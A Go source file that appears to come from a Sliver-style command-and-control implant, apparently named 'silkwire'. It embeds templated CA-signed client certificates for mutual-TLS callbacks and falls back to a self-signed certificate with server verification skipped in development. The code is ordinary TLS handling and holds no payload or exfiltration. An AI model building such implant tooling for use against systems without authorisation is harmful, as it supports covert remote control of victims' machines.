package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"strings"
	"time"
)

// These will be replaced during compilation with CA-signed certificates (Sliver-style)
var (
	// EmbeddedClientCert contains the CA-signed client certificate in PEM format
	EmbeddedClientCert = `{{.ClientCert}}`
	// EmbeddedClientKey contains the client private key in PEM format
	EmbeddedClientKey = `{{.ClientKey}}`
	// EmbeddedCACert contains the CA certificate for server verification
	EmbeddedCACert = `{{.CACert}}`
)

// GetClientCertificate returns the embedded CA-signed client certificate
func GetClientCertificate() (tls.Certificate, error) {
	// If embedded certificates are available, use them (production/compiled builds)
	// Check if certificates contain actual PEM data (start with -----BEGIN)
	if len(EmbeddedClientCert) > 50 && len(EmbeddedClientKey) > 50 &&
		strings.HasPrefix(EmbeddedClientCert, "-----BEGIN") &&
		strings.HasPrefix(EmbeddedClientKey, "-----BEGIN") {
		cert, err := tls.X509KeyPair([]byte(EmbeddedClientCert), []byte(EmbeddedClientKey))
		if err != nil {
			return tls.Certificate{}, fmt.Errorf("failed to load embedded client certificate: %v", err)
		}
		// Parse certificate for metadata
		cert.Leaf, _ = x509.ParseCertificate(cert.Certificate[0])
		return cert, nil
	}

	// Fallback to self-signed for development/testing
	return GenerateSelfSignedClientCert("dev-implant")
}

// GetCACertPool returns the CA certificate pool for server verification
func GetCACertPool() (*x509.CertPool, error) {
	// Check if CA certificate contains actual PEM data (start with -----BEGIN)
	if len(EmbeddedCACert) > 50 && strings.HasPrefix(EmbeddedCACert, "-----BEGIN") {
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM([]byte(EmbeddedCACert)) {
			return nil, fmt.Errorf("failed to parse embedded CA certificate")
		}
		return pool, nil
	}

	// For development, return nil to skip CA verification
	return nil, nil
}

// GenerateSelfSignedClientCert generates a self-signed client certificate (fallback for dev)
func GenerateSelfSignedClientCert(commonName string) (tls.Certificate, error) {
	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return tls.Certificate{}, err
	}

	tmpl := &x509.Certificate{
		SerialNumber:          serialNumber,
		Subject:               pkix.Name{CommonName: commonName, Organization: []string{"silkwire-implant-dev"}},
		NotBefore:             time.Now().Add(-1 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &privKey.PublicKey, privKey)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privKey)})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return tls.Certificate{}, err
	}
	cert.Leaf, _ = x509.ParseCertificate(derBytes)
	return cert, nil
}
